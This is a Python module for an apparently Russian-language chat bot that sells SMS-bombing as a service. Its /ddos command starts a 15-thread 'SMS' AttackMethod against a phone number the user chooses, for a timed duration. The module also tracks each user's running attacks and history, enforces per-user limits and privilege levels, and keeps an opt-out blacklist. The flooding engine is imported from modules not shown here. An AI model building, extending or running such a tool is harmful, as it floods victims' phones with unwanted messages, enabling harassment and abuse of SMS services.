from processing.passport import Passport
from tools.api import *
from tools.ddos_tools import *
from sql.users_table import *
import sql.blacklist_table as bltable
import sql.ddosnumberlist_table as ddostable
from settings.response_info import *
from sql.models import *


ddos_dict = {}


def __start_ddos_number(user_id, number: str, time: int):
    number_data = {
        'method': AttackMethod(name='SMS', duration=time, threads=15, target=number),
        'timer': ModTimer(time, __stop_ddos_number, (user_id, number))
    }

    if user_id not in ddos_dict:
        ddos_dict[user_id] = {number: number_data}
    else:
        ddos_dict[user_id][number] = number_data

    number_data['timer'].start()
    number_data['method'].Start()
    messages_send(user_id, info['str_ddos'].format(number, time))
    ddostable.add_number(user_id, number)


def __stop_ddos_number(user_id, number: str):
    if user_id in ddos_dict:
        numbers = ddos_dict[user_id]
        if number in numbers:
            number_data = numbers[number]
            number_data['method'].is_running = False
            number_data['timer'].cancel()

            del numbers[number]

            if not ddos_dict[user_id]:
                del ddos_dict[user_id]

            messages_send(user_id, info['stp_ddos'].format(number))
        else:
            messages_send(user_id, errors['er_no_ddos_number'].format(number))
    else:
        messages_send(user_id, errors['er_no_ddos_numbers'].format(number))


def get_ddos_info(user_pas: Passport):
    last_numbers = DdosNumberList.select(). \
        where(DdosNumberList.user_id == user_pas.user_id). \
        limit(5)

    current_numbers = ddos_dict[user_pas.user_id] if user_pas.user_id in ddos_dict else None

    msg = info['ddos_info']

    if current_numbers:
        m = ''
        for key, data in current_numbers.items():
            m += f'номер: {key} отсалось секкунд: {int(data["timer"].remaining())}\n'

        msg = msg.format(m, '{}')

    else:
        msg = msg.format(errors['er_no_ddos_numbers'], '{}')

    if last_numbers:
        m = ''

        for data in last_numbers:
            m += f'номер: {data.number} дата: {data.date}\n'

        msg = msg.format(m)
    else:
        msg = msg.format(errors['er_no_ddos_history'])

    return msg


def get_set_info(user_id: int = None):
    msg = info['set_info']

    if user_id:
        user = get_user(user_id)
        if user:
            msg = msg.format(f'id: {user_id}, имя: {user["name"]}, '
                             f'фамилия: {user["surname"]}, статус: {user["privilege"]}')
        else:
            return errors['er_no_user']
    else:
        users = get_users()

        if users:
            m = ''
            for user in users:
                m += f'id: {user["user_id"]}, имя: {user["name"]}, '
                f'фамилия: {user["surname"]}, статус: {user["privilege"]}\n'

            msg = msg.format(m)

        else:
            return errors['er_no_users']

    return msg


def get_bl_info(user_pas: Passport):
    msg = info['bl_info']
    numbers = bltable.get_numbers(user_pas.user_id)

    if numbers:
        m = ''
        for data in numbers:
            m += f'номер: {data["number"]}\n'

        msg = msg.format(m)
    else:
        msg = msg.format(errors['er_no_bl_numbers'])

    return msg


def ddos_command(user_pas: Passport, number: str = None, time: int = None, stop: bool = False, command: str = None):
    if command:
        if command == 'help':
            messages_send(user_pas.user_id, commands_help['/ddos'])
        elif command == 'info':
            messages_send(user_pas.user_id, get_ddos_info(user_pas))
        return

    if not number:
        messages_send(user_pas.user_id, errors['er_invalid_args'].format('/ddos', '/ddos'))
        return

    number = GetTargetAddress(number, 'SMS')

    if stop:
        __stop_ddos_number(user_pas.user_id, number)
        return

    if not time:
        time = 100

    ddos_limits = user_pas.commands_config['/ddos']['lim']

    if 'simult' in ddos_limits:
        if user_pas.user_id in ddos_dict:
            if len(ddos_dict[user_pas.user_id]) > ddos_limits['simult']:
                messages_send(user_pas.user_id, errors['er_limit_ddos_num'])
                return

    if bltable.is_in_bl(number):
        messages_send(user_pas.user_id, errors['er_number_in_bl'].format(number))
        return

    __start_ddos_number(user_pas.user_id, number, time)


def set_command(user_pas: Passport, target_id: int = None, status: str = None, command: str = None):
    if command:
        if command == 'help':
            messages_send(user_pas.user_id, commands_help['/set'])
            return
        elif command == 'info':
            messages_send(user_pas.user_id, get_set_info(target_id))
        return

    if not target_id or not status:
        messages_send(user_pas.user_id, errors['er_invalid_args'].format('/set', '/set'))
        return

    if update_info(target_id, privilege=status):
        messages_send(user_pas.user_id, info['data_updated'].format(str(target_id)))
    else:
        messages_send(user_pas.user_id, errors['er_data_not_updated'].format(str(target_id)))


def blist_command(user_pas: Passport, number: str = None, command: str = None):

    if command == 'help':
        messages_send(user_pas.user_id, commands_help['/bl'])
        return
    elif command == 'info':
        messages_send(user_pas.user_id, get_bl_info(user_pas))
        return

    if not number:
        messages_send(user_pas.user_id, errors['er_invalid_args'].format('/bl', '/bl'))
        return

    number = GetTargetAddress(number, 'SMS')

    blist_limits = user_pas.commands_config['/bl']['lim']

    if 'datalim' in blist_limits:
        if blist_limits['datalim'] < len(bltable.get_numbers(user_pas.user_id)):
            messages_send(user_pas.user_id, errors['er_limit_bl_num'])
            return

    if command == 'add':
        if bltable.add_number(user_pas.user_id, number):
            messages_send(user_pas.user_id, info['bl_add'].format(number))
        else:
            messages_send(user_pas.user_id, errors['er_already_in_bl'].format(number))
    else:
        if bltable.del_number(user_pas.user_id, number):
            messages_send(user_pas.user_id, info['bl_del'].format(number))
        else:
            messages_send(user_pas.user_id, errors['er_cant_del_bl'].format(number))


def get_help_message(user_pas: Passport):
    msg = ''

    commands_conf = user_pas.commands_config['/ddos']
    msg += commands_help['/ddos'].format(
            str(commands_conf['param']['t']['lim']),
            str(commands_conf['lim']['simult']),
            str(commands_conf['lim']['daylim']))

    if '/bl' in user_pas.commands_config:
        commands_conf = user_pas.commands_config['/bl']
        msg += commands_help['/bl'].format(
                str(commands_conf['lim']['datalim'])
        )

    if '/set' in user_pas.commands_config:
        msg += commands_help['/set']

    msg += commands_help['/help']

    return msg


def help_command(user_pas: Passport):
    messages_send(user_pas.user_id, get_help_message(user_pas))
